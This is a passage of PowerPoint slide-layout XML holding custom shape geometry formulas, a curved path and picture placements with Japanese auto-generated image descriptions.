              <a:gd name="csY5" fmla="*/ 3113081 h 3446408"/>
              <a:gd name="csX0" fmla="*/ 4175773 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3113081 h 3465611"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3465611"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3465611"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3465611"/>
              <a:gd name="csX4" fmla="*/ 31701 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3122184 h 3465611"/>
              <a:gd name="csX5" fmla="*/ 4175773 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3113081 h 3465611"/>
              <a:gd name="csX0" fmla="*/ 4175773 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3113081 h 3417739"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3417739"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3417739"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3417739"/>
              <a:gd name="csX4" fmla="*/ 31701 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3122184 h 3417739"/>
              <a:gd name="csX5" fmla="*/ 4175773 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3113081 h 3417739"/>
              <a:gd name="csX0" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3135769 h 3427729"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3427729"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3427729"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3427729"/>
              <a:gd name="csX4" fmla="*/ 31701 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3122184 h 3427729"/>
              <a:gd name="csX5" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3135769 h 3427729"/>
              <a:gd name="csX0" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3135769 h 3484767"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3484767"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3484767"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3484767"/>
              <a:gd name="csX4" fmla="*/ 39318 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3218606 h 3484767"/>
              <a:gd name="csX5" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3135769 h 3484767"/>
              <a:gd name="csX0" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3135769 h 3446271"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3446271"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3446271"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3446271"/>
              <a:gd name="csX4" fmla="*/ 39318 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3218606 h 3446271"/>
              <a:gd name="csX5" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3135769 h 3446271"/>
              <a:gd name="csX0" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3464683"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3464683"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3464683"/>
              <a:gd name="csX4" fmla="*/ 39318 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3218606 h 3464683"/>
              <a:gd name="csX5" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX0" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY0" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX1" fmla="*/ 9785093 w 9792792"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3464683"/>
              <a:gd name="csX2" fmla="*/ 9792792 w 9792792"/>
              <a:gd name="csY2" fmla="*/ 0 h 3464683"/>
              <a:gd name="csX3" fmla="*/ 0 w 9792792"/>
              <a:gd name="csY3" fmla="*/ 26735 h 3464683"/>
              <a:gd name="csX4" fmla="*/ 39318 w 9792792"/>
              <a:gd name="csY4" fmla="*/ 3218606 h 3464683"/>
              <a:gd name="csX5" fmla="*/ 4556665 w 9792792"/>
              <a:gd name="csY5" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX0" fmla="*/ 4532288 w 9768415"/>
              <a:gd name="csY0" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX1" fmla="*/ 9760716 w 9768415"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3464683"/>
              <a:gd name="csX2" fmla="*/ 9768415 w 9768415"/>
              <a:gd name="csY2" fmla="*/ 0 h 3464683"/>
              <a:gd name="csX3" fmla="*/ 0 w 9768415"/>
              <a:gd name="csY3" fmla="*/ 20685 h 3464683"/>
              <a:gd name="csX4" fmla="*/ 14941 w 9768415"/>
              <a:gd name="csY4" fmla="*/ 3218606 h 3464683"/>
              <a:gd name="csX5" fmla="*/ 4532288 w 9768415"/>
              <a:gd name="csY5" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX0" fmla="*/ 4533013 w 9769140"/>
              <a:gd name="csY0" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX1" fmla="*/ 9761441 w 9769140"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3464683"/>
              <a:gd name="csX2" fmla="*/ 9769140 w 9769140"/>
              <a:gd name="csY2" fmla="*/ 0 h 3464683"/>
              <a:gd name="csX3" fmla="*/ 725 w 9769140"/>
              <a:gd name="csY3" fmla="*/ 20685 h 3464683"/>
              <a:gd name="csX4" fmla="*/ 4239 w 9769140"/>
              <a:gd name="csY4" fmla="*/ 3218606 h 3464683"/>
              <a:gd name="csX5" fmla="*/ 4533013 w 9769140"/>
              <a:gd name="csY5" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX0" fmla="*/ 4532288 w 9768415"/>
              <a:gd name="csY0" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX1" fmla="*/ 9760716 w 9768415"/>
              <a:gd name="csY1" fmla="*/ 1594015 h 3464683"/>
              <a:gd name="csX2" fmla="*/ 9768415 w 9768415"/>
              <a:gd name="csY2" fmla="*/ 0 h 3464683"/>
              <a:gd name="csX3" fmla="*/ 0 w 9768415"/>
              <a:gd name="csY3" fmla="*/ 20685 h 3464683"/>
              <a:gd name="csX4" fmla="*/ 3514 w 9768415"/>
              <a:gd name="csY4" fmla="*/ 3218606 h 3464683"/>
              <a:gd name="csX5" fmla="*/ 4532288 w 9768415"/>
              <a:gd name="csY5" fmla="*/ 3135769 h 3464683"/>
              <a:gd name="csX0" fmla="*/ 4528774 w 9764901"/>
              <a:gd name="csY0" fmla="*/ 3208670 h 3537584"/>
              <a:gd name="csX1" fmla="*/ 9757202 w 9764901"/>
              <a:gd name="csY1" fmla="*/ 1666916 h 3537584"/>
              <a:gd name="csX2" fmla="*/ 9764901 w 9764901"/>
              <a:gd name="csY2" fmla="*/ 72901 h 3537584"/>
              <a:gd name="csX3" fmla="*/ 295 w 9764901"/>
              <a:gd name="csY3" fmla="*/ 0 h 3537584"/>
              <a:gd name="csX4" fmla="*/ 0 w 9764901"/>
              <a:gd name="csY4" fmla="*/ 3291507 h 3537584"/>
              <a:gd name="csX5" fmla="*/ 4528774 w 9764901"/>
              <a:gd name="csY5" fmla="*/ 3208670 h 3537584"/>
              <a:gd name="csX0" fmla="*/ 4532439 w 9768566"/>
              <a:gd name="csY0" fmla="*/ 3208670 h 3537584"/>
              <a:gd name="csX1" fmla="*/ 9760867 w 9768566"/>
              <a:gd name="csY1" fmla="*/ 1666916 h 3537584"/>
              <a:gd name="csX2" fmla="*/ 9768566 w 9768566"/>
              <a:gd name="csY2" fmla="*/ 72901 h 3537584"/>
              <a:gd name="csX3" fmla="*/ 3960 w 9768566"/>
              <a:gd name="csY3" fmla="*/ 0 h 3537584"/>
              <a:gd name="csX4" fmla="*/ 3665 w 9768566"/>
              <a:gd name="csY4" fmla="*/ 3291507 h 3537584"/>
              <a:gd name="csX5" fmla="*/ 4532439 w 9768566"/>
              <a:gd name="csY5" fmla="*/ 3208670 h 3537584"/>
              <a:gd name="csX0" fmla="*/ 4532439 w 9768566"/>
              <a:gd name="csY0" fmla="*/ 3208670 h 3537584"/>
              <a:gd name="csX1" fmla="*/ 9760867 w 9768566"/>
              <a:gd name="csY1" fmla="*/ 1666916 h 3537584"/>
              <a:gd name="csX2" fmla="*/ 9768566 w 9768566"/>
              <a:gd name="csY2" fmla="*/ 72901 h 3537584"/>
              <a:gd name="csX3" fmla="*/ 3960 w 9768566"/>
              <a:gd name="csY3" fmla="*/ 0 h 3537584"/>
              <a:gd name="csX4" fmla="*/ 3665 w 9768566"/>
              <a:gd name="csY4" fmla="*/ 3291507 h 3537584"/>
              <a:gd name="csX5" fmla="*/ 4532439 w 9768566"/>
              <a:gd name="csY5" fmla="*/ 3208670 h 3537584"/>
              <a:gd name="csX0" fmla="*/ 4532439 w 9761617"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX1" fmla="*/ 9760867 w 9761617"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3539835"/>
              <a:gd name="csX2" fmla="*/ 9760948 w 9761617"/>
              <a:gd name="csY2" fmla="*/ 0 h 3539835"/>
              <a:gd name="csX3" fmla="*/ 3960 w 9761617"/>
              <a:gd name="csY3" fmla="*/ 2251 h 3539835"/>
              <a:gd name="csX4" fmla="*/ 3665 w 9761617"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3539835"/>
              <a:gd name="csX5" fmla="*/ 4532439 w 9761617"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX0" fmla="*/ 4532439 w 9761617"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX1" fmla="*/ 9760867 w 9761617"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3539835"/>
              <a:gd name="csX2" fmla="*/ 9760948 w 9761617"/>
              <a:gd name="csY2" fmla="*/ 0 h 3539835"/>
              <a:gd name="csX3" fmla="*/ 3960 w 9761617"/>
              <a:gd name="csY3" fmla="*/ 2251 h 3539835"/>
              <a:gd name="csX4" fmla="*/ 3665 w 9761617"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3539835"/>
              <a:gd name="csX5" fmla="*/ 4532439 w 9761617"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX0" fmla="*/ 4532439 w 9761239"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX1" fmla="*/ 9760867 w 9761239"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3539835"/>
              <a:gd name="csX2" fmla="*/ 9760948 w 9761239"/>
              <a:gd name="csY2" fmla="*/ 0 h 3539835"/>
              <a:gd name="csX3" fmla="*/ 3960 w 9761239"/>
              <a:gd name="csY3" fmla="*/ 2251 h 3539835"/>
              <a:gd name="csX4" fmla="*/ 3665 w 9761239"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3539835"/>
              <a:gd name="csX5" fmla="*/ 4532439 w 9761239"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX0" fmla="*/ 4532439 w 9762057"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX1" fmla="*/ 9760867 w 9762057"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3539835"/>
              <a:gd name="csX2" fmla="*/ 9760948 w 9762057"/>
              <a:gd name="csY2" fmla="*/ 0 h 3539835"/>
              <a:gd name="csX3" fmla="*/ 3960 w 9762057"/>
              <a:gd name="csY3" fmla="*/ 2251 h 3539835"/>
              <a:gd name="csX4" fmla="*/ 3665 w 9762057"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3539835"/>
              <a:gd name="csX5" fmla="*/ 4532439 w 9762057"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX0" fmla="*/ 4532439 w 9762057"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX1" fmla="*/ 9760867 w 9762057"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3539835"/>
              <a:gd name="csX2" fmla="*/ 9760948 w 9762057"/>
              <a:gd name="csY2" fmla="*/ 0 h 3539835"/>
              <a:gd name="csX3" fmla="*/ 3960 w 9762057"/>
              <a:gd name="csY3" fmla="*/ 2251 h 3539835"/>
              <a:gd name="csX4" fmla="*/ 3665 w 9762057"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3539835"/>
              <a:gd name="csX5" fmla="*/ 4532439 w 9762057"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX0" fmla="*/ 4528774 w 9758392"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX1" fmla="*/ 9757202 w 9758392"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3539835"/>
              <a:gd name="csX2" fmla="*/ 9757283 w 9758392"/>
              <a:gd name="csY2" fmla="*/ 0 h 3539835"/>
              <a:gd name="csX3" fmla="*/ 295 w 9758392"/>
              <a:gd name="csY3" fmla="*/ 2251 h 3539835"/>
              <a:gd name="csX4" fmla="*/ 0 w 9758392"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3539835"/>
              <a:gd name="csX5" fmla="*/ 4528774 w 9758392"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX0" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX1" fmla="*/ 9758820 w 9760010"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3539835"/>
              <a:gd name="csX2" fmla="*/ 9758901 w 9760010"/>
              <a:gd name="csY2" fmla="*/ 0 h 3539835"/>
              <a:gd name="csX3" fmla="*/ 9 w 9760010"/>
              <a:gd name="csY3" fmla="*/ 832 h 3539835"/>
              <a:gd name="csX4" fmla="*/ 1618 w 9760010"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3539835"/>
              <a:gd name="csX5" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX0" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX1" fmla="*/ 9758820 w 9760010"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3539835"/>
              <a:gd name="csX2" fmla="*/ 9758901 w 9760010"/>
              <a:gd name="csY2" fmla="*/ 0 h 3539835"/>
              <a:gd name="csX3" fmla="*/ 9 w 9760010"/>
              <a:gd name="csY3" fmla="*/ 832 h 3539835"/>
              <a:gd name="csX4" fmla="*/ 1618 w 9760010"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3539835"/>
              <a:gd name="csX5" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3539835"/>
              <a:gd name="csX0" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3543651"/>
              <a:gd name="csX1" fmla="*/ 9758820 w 9760010"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3543651"/>
              <a:gd name="csX2" fmla="*/ 9758901 w 9760010"/>
              <a:gd name="csY2" fmla="*/ 0 h 3543651"/>
              <a:gd name="csX3" fmla="*/ 9 w 9760010"/>
              <a:gd name="csY3" fmla="*/ 832 h 3543651"/>
              <a:gd name="csX4" fmla="*/ 1618 w 9760010"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3543651"/>
              <a:gd name="csX5" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3543651"/>
              <a:gd name="csX0" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3551406"/>
              <a:gd name="csX1" fmla="*/ 9758820 w 9760010"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3551406"/>
              <a:gd name="csX2" fmla="*/ 9758901 w 9760010"/>
              <a:gd name="csY2" fmla="*/ 0 h 3551406"/>
              <a:gd name="csX3" fmla="*/ 9 w 9760010"/>
              <a:gd name="csY3" fmla="*/ 832 h 3551406"/>
              <a:gd name="csX4" fmla="*/ 1618 w 9760010"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3551406"/>
              <a:gd name="csX5" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3551406"/>
              <a:gd name="csX0" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3551406"/>
              <a:gd name="csX1" fmla="*/ 9758820 w 9760010"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3551406"/>
              <a:gd name="csX2" fmla="*/ 9758901 w 9760010"/>
              <a:gd name="csY2" fmla="*/ 0 h 3551406"/>
              <a:gd name="csX3" fmla="*/ 9 w 9760010"/>
              <a:gd name="csY3" fmla="*/ 832 h 3551406"/>
              <a:gd name="csX4" fmla="*/ 1618 w 9760010"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3551406"/>
              <a:gd name="csX5" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3551406"/>
              <a:gd name="csX0" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3551406"/>
              <a:gd name="csX1" fmla="*/ 9758820 w 9760010"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3551406"/>
              <a:gd name="csX2" fmla="*/ 9758901 w 9760010"/>
              <a:gd name="csY2" fmla="*/ 0 h 3551406"/>
              <a:gd name="csX3" fmla="*/ 9 w 9760010"/>
              <a:gd name="csY3" fmla="*/ 832 h 3551406"/>
              <a:gd name="csX4" fmla="*/ 1618 w 9760010"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3551406"/>
              <a:gd name="csX5" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3551406"/>
              <a:gd name="csX0" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3562521"/>
              <a:gd name="csX1" fmla="*/ 9758820 w 9760010"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3562521"/>
              <a:gd name="csX2" fmla="*/ 9758901 w 9760010"/>
              <a:gd name="csY2" fmla="*/ 0 h 3562521"/>
              <a:gd name="csX3" fmla="*/ 9 w 9760010"/>
              <a:gd name="csY3" fmla="*/ 832 h 3562521"/>
              <a:gd name="csX4" fmla="*/ 1618 w 9760010"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3562521"/>
              <a:gd name="csX5" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3562521"/>
              <a:gd name="csX0" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY0" fmla="*/ 3210921 h 3562521"/>
              <a:gd name="csX1" fmla="*/ 9758820 w 9760010"/>
              <a:gd name="csY1" fmla="*/ 1669167 h 3562521"/>
              <a:gd name="csX2" fmla="*/ 9758901 w 9760010"/>
              <a:gd name="csY2" fmla="*/ 0 h 3562521"/>
              <a:gd name="csX3" fmla="*/ 9 w 9760010"/>
              <a:gd name="csY3" fmla="*/ 832 h 3562521"/>
              <a:gd name="csX4" fmla="*/ 1618 w 9760010"/>
              <a:gd name="csY4" fmla="*/ 3293758 h 3562521"/>
              <a:gd name="csX5" fmla="*/ 4530392 w 9760010"/>
              <a:gd name="csY5" fmla="*/ 3210921 h 3562521"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="csX0" y="csY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="csX1" y="csY1"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="csX2" y="csY2"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="csX3" y="csY3"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="csX4" y="csY4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="csX5" y="csY5"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9760010" h="3562521">
                <a:moveTo>
                  <a:pt x="4530392" y="3210921"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="7245526" y="2264049"/>
                  <a:pt x="7315552" y="1812899"/>
                  <a:pt x="9758820" y="1669167"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="9761386" y="1221005"/>
                  <a:pt x="9759023" y="38635"/>
                  <a:pt x="9758901" y="0"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="9" y="832"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="-217" y="42435"/>
                  <a:pt x="3748" y="3296113"/>
                  <a:pt x="1618" y="3293758"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1536535" y="3666354"/>
                  <a:pt x="3232671" y="3663234"/>
                  <a:pt x="4530392" y="3210921"/>
                </a:cubicBezTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:cu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グラフィックス 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7E372F0C-122B-DAA5-4884-F486F4BC642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764483"/>
            <a:ext cx="12192000" cy="5329033"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="23" name="図 22" descr="挿絵, プレート が含まれている画像&#10;&#10;AI 生成コンテンツは誤りを含む可能性があります。">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD08D5EF-F9B8-EC81-E753-D29D698BE658}"/>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502776" y="329051"/>
            <a:ext cx="2034540" cy="556024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="24" name="図 23" descr="窓, テーブル, 座る, 女性 が含まれている画像&#10;&#10;AI 生成コンテンツは誤りを含む可能性があります。">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E214B1E3-E5D0-D760-4D95-F37A9E9DC61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10475587" y="2249010"/>
            <a:ext cx="1553618" cy="1545123"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="50800" dist="38100" dir="2700000" algn="tl" rotWithShape="0">
              <a:prstClr val="black">
                <a:alpha val="40000"/>
              </a:prstClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="図 25" descr="ノートパソコンで作業をしている人たち&#10;&#10;AI 生成コンテンツは誤りを含む可能性があります。">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DCF3E1A-9816-0411-BA2F-F3860C0CFBA8}"/>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8609352" y="1600177"/>
            <a:ext cx="1866235" cy="1848438"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="50800" dist="38100" dir="2700000" algn="tl" rotWithShape="0">
              <a:prstClr val="black">
                <a:alpha val="40000"/>
              </a:prstClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="27" name="図 26" descr="建物, スポーツゲーム, 女性, 男 が含まれている画像&#10;&#10;AI 生成コンテンツは誤りを含む可能性があります。">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B76F2F6-AD07-332F-2912-BE62CC81E964}"/>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a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8651419" y="3659899"/>
            <a:ext cx="2752979" cy="2823354"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="50800" dist="38100" dir="2700000" algn="tl" rotWithShape="0">
              <a:prstClr val="black">
                <a:alpha val="40000"/>
              </a:prstClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28" name="グラフィックス 27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC91B00C-4BED-957A-0C8C-491B6D9C8ECC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip>
            <a:extLst>
              <a:ext uri="{96DAC541-7B7A-43D3-8B79-37D633B846F1}">
                <asvg:svgBlip xmlns:asvg="http://schemas.microsoft.com/office/drawing/2016/SVG/main" r:embed="rId8"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="3089" t="-2016" r="-11808" b="-886"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm rot="16887347" flipV="1">
            <a:off x="5071916" y="2537604"/>
            <a:ext cx="6773051" cy="2520325"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid">
            <a:avLst>
              <a:gd name="adj" fmla="val 20061"/>
            </a:avLst>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="図 3" descr="ノートパソコンのキーボードに手を当てている&#10;&#10;AI 生成コンテンツは誤りを含む可能性があります。">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{493E6069-6291-7E8F-DBB6-A10BA51EE361}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId9" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9844322" y="228422"/>
            <a:ext cx="1512499" cy="1518680"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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237151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F114BEFE-30F4-06E8-6BE0-619CDBC06F00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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80327" y="6523613"/>
            <a:ext cx="1032653" cy="227114"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1580760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27999" y="11832"/>
            <a:ext cx="11160840" cy="423341"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
